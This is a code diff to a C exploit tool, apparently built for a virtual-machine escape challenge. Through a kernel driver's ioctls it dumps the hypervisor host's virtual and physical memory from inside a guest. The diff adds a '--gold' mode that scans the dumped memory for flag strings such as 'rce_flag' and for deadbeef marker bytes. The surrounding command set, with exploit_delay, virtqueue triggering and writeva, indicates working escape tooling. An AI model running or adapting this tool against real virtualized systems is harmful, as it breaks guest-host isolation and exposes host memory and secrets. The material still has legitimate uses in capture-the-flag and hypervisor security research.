@@ -114,6 +114,23 @@ struct host_phys_access {
     unsigned char *user_buffer;
 };
 
+// Gold pattern constants
+#define GOLD_FLAG_STRINGS_COUNT 4
+static const char *GOLD_ASCII_STRINGS[GOLD_FLAG_STRINGS_COUNT] = {
+    "write_flag",
+    "read_flag", 
+    "rce_flag",
+    "dcba"
+};
+
+#define GOLD_HEX_STRINGS_COUNT 4
+static const char *GOLD_HEX_STRINGS[GOLD_HEX_STRINGS_COUNT] = {
+    "44434241efbeadde",
+    "44342414deadbeef",
+    "deadbeef14243444",
+    "deadbeef41424344"
+};
+
 void print_usage(char *prog_name) {
     fprintf(stderr, "  Usage: %s <command> [args...]\n", prog_name);
     fprintf(stderr, "  Commands:\n");
@@ -147,8 +164,9 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  attachvq <device_id> <vq_pfn> <queue_index>\n");
     fprintf(stderr, "  trigvq <device_id>\n");
     fprintf(stderr, "  scanphys <start_addr_hex> <end_addr_hex> <step_bytes>\n");
-    fprintf(stderr, "  scanhostmem <start_host_vaddr_hex> <end_host_vaddr_hex> <step_bytes>\n");
-    fprintf(stderr, "  scanhostphys <start_host_paddr_hex> <end_host_paddr_hex> <step_bytes>\n");
+    fprintf(stderr, "  scanhostmem <start_host_vaddr_hex> <end_host_vaddr_hex> <step_bytes> [--gold]\n");
+    fprintf(stderr, "  scanhostphys <start_host_paddr_hex> <end_host_paddr_hex> <step_bytes> [--gold]\n");
+    fprintf(stderr, "  --gold flag: Only output if gold patterns found (reduces noise)\n");
     fprintf(stderr, "  Virtio device IDs: NET=1, BLOCK=2, CONSOLE=3\n");
 }
 
@@ -178,6 +196,82 @@ void exploit_delay(int nanoseconds) {
     struct timespec req = {0};
     req.tv_nsec = nanoseconds;
     nanosleep(&req, NULL);
+}
+
+// Helper function to check for gold patterns
+int check_gold_patterns(const unsigned char *data, unsigned long length, unsigned long base_addr) {
+    int found = 0;
+    
+    // Check ASCII patterns
+    for (int i = 0; i < GOLD_FLAG_STRINGS_COUNT; i++) {
+        const char *pattern = GOLD_ASCII_STRINGS[i];
+        size_t pattern_len = strlen(pattern);
+        
+        for (unsigned long j = 0; j <= length - pattern_len; j++) {
+            if (memcmp(data + j, pattern, pattern_len) == 0) {
+                printf("[GOLD] Found ASCII pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
+                       pattern, j, base_addr + j);
+                found = 1;
+                
+                // Print hex and ASCII context
+                printf("Hex context: ");
+                unsigned long start = (j >= 16) ? j - 16 : 0;
+                unsigned long end = (j + pattern_len + 16 < length) ? j + pattern_len + 16 : length;
+                for (unsigned long k = start; k < end; k++) {
+                    printf("%02X", data[k]);
+                }
+                printf("\nASCII context: ");
+                for (unsigned long k = start; k < end; k++) {
+                    unsigned char c = data[k];
+                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                }
+                printf("\n\n");
+            }
+        }
+    }
+    
+    // Check hex patterns (convert hex string to bytes and search)
+    for (int i = 0; i < GOLD_HEX_STRINGS_COUNT; i++) {
+        const char *hex_pattern = GOLD_HEX_STRINGS[i];
+        size_t hex_len = strlen(hex_pattern);
+        if (hex_len % 2 != 0) continue;
+        
+        size_t byte_len = hex_len / 2;
+        unsigned char *pattern_bytes = malloc(byte_len);
+        if (!pattern_bytes) continue;
+        
+        // Convert hex string to bytes
+        for (size_t p = 0; p < byte_len; p++) {
+            sscanf(hex_pattern + 2*p, "%2hhx", &pattern_bytes[p]);
+        }
+        
+        // Search for the byte pattern
+        for (unsigned long j = 0; j <= length - byte_len; j++) {
+            if (memcmp(data + j, pattern_bytes, byte_len) == 0) {
+                printf("[GOLD] Found HEX pattern '%s' at offset 0x%lx (addr 0x%lx)\n", 
+                       hex_pattern, j, base_addr + j);
+                found = 1;
+                
+                // Print hex and ASCII context
+                printf("Hex context: ");
+                unsigned long start = (j >= 16) ? j - 16 : 0;
+                unsigned long end = (j + byte_len + 16 < length) ? j + byte_len + 16 : length;
+                for (unsigned long k = start; k < end; k++) {
+                    printf("%02X", data[k]);
+                }
+                printf("\nASCII context: ");
+                for (unsigned long k = start; k < end; k++) {
+                    unsigned char c = data[k];
+                    printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                }
+                printf("\n\n");
+            }
+        }
+        
+        free(pattern_bytes);
+    }
+    
+    return found;
 }
 
 int main(int argc, char *argv[]) {
@@ -586,69 +680,139 @@ int main(int argc, char *argv[]) {
         free(buf);
 
     } else if (strcmp(cmd, "scanhostmem") == 0) {
-        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
+        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
+        
+        int gold_scan = 0;
+        if (argc >= 6 && strcmp(argv[5], "--gold") == 0) {
+            gold_scan = 1;
+        }
+        
         unsigned long start = strtoul(argv[2], NULL, 16);
         unsigned long end = strtoul(argv[3], NULL, 16);
         unsigned long step = strtoul(argv[4], NULL, 10);
+        
         if (step == 0 || step > 99999999) {
             fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
             close(fd);
             return 1;
         }
+        
         unsigned char *buf = malloc(step);
         if (!buf) {
             perror("malloc for scanhostmem buffer");
             close(fd);
             return 1;
         }
+        
+        int gold_found_any = 0;
+        
         for (unsigned long addr = start; addr < end; addr += step) {
             struct host_mem_access req = {0};
             req.host_addr = addr;
             req.length = step;
             req.user_buffer = buf;
+            
             if (ioctl(fd, IOCTL_READ_HOST_MEM, &req) < 0) {
-                printf("0x%lX: ERROR\n", addr);
-            } else {
-                printf("0x%lX:", addr);
-                for (unsigned long i = 0; i < step; ++i) {
-                    printf("%02X", buf[i]);
+                if (!gold_scan) {
+                    printf("0x%lX: ERROR\n", addr);
                 }
-                printf("\n");
+            } else {
+                if (gold_scan) {
+                    // Only show output if gold patterns found
+                    int gold_found = check_gold_patterns(buf, step, addr);
+                    if (gold_found) {
+                        gold_found_any = 1;
+                    }
+                } else {
+                    // Regular output with both hex and ASCII
+                    printf("0x%lX:\nHex: ", addr);
+                    for (unsigned long i = 0; i < step; ++i) {
+                        printf("%02X", buf[i]);
+                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
+                    }
+                    printf("\nASCII: ");
+                    for (unsigned long i = 0; i < step; ++i) {
+                        unsigned char c = buf[i];
+                        printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
+                    }
+                    printf("\n\n");
+                }
             }
         }
+        
+        if (gold_scan && !gold_found_any) {
+            printf("No gold patterns found in scanned range.\n");
+        }
+        
         free(buf);
 
     } else if (strcmp(cmd, "scanhostphys") == 0) {
-        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
+        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
+        
+        int gold_scan = 0;
+        if (argc >= 6 && strcmp(argv[5], "--gold") == 0) {
+            gold_scan = 1;
+        }
+        
         unsigned long start = strtoul(argv[2], NULL, 16);
         unsigned long end = strtoul(argv[3], NULL, 16);
         unsigned long step = strtoul(argv[4], NULL, 10);
+        
         if (step == 0 || step > 99999999) {
             fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
             close(fd);
             return 1;
         }
+        
         unsigned char *buf = malloc(step);
         if (!buf) {
             perror("malloc for scanhostphys buffer");
             close(fd);
             return 1;
         }
+        
+        int gold_found_any = 0;
+        
         for (unsigned long addr = start; addr < end; addr += step) {
             struct host_phys_access req = {0};
             req.host_phys_addr = addr;
             req.length = step;
             req.user_buffer = buf;
+            
             if (ioctl(fd, IOCTL_READ_HOST_PHYS, &req) < 0) {
-                printf("0x%lX: ERROR\n", addr);
-            } else {
-                printf("0x%lX:", addr);
-                for (unsigned long i = 0; i < step; ++i) {
-                    printf("%02X", buf[i]);
+                if (!gold_scan) {
+                    printf("0x%lX: ERROR\n", addr);
                 }
-                printf("\n");
+            } else {
+                if (gold_scan) {
+                    // Only show output if gold patterns found
+                    int gold_found = check_gold_patterns(buf, step, addr);
+                    if (gold_found) {
+                        gold_found_any = 1;
+                    }
+                } else {
+                    // Regular output with both hex and ASCII
+                    printf("0x%lX:\nHex: ", addr);
+                    for (unsigned long i = 0; i < step; ++i) {
+                        printf("%02X", buf[i]);
+                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
+                    }
+                    printf("\nASCII: ");
+                    for (unsigned long i = 0; i < step; ++i) {
+                        unsigned char c = buf[i];
+                        printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
+                    }
+                    printf("\n\n");
+                }
             }
         }
+        
+        if (gold_scan && !gold_found_any) {
+            printf("No gold patterns found in scanned range.\n");
+        }
+        
         free(buf);
 
     } else if (strcmp(cmd, "writeva") == 0) {
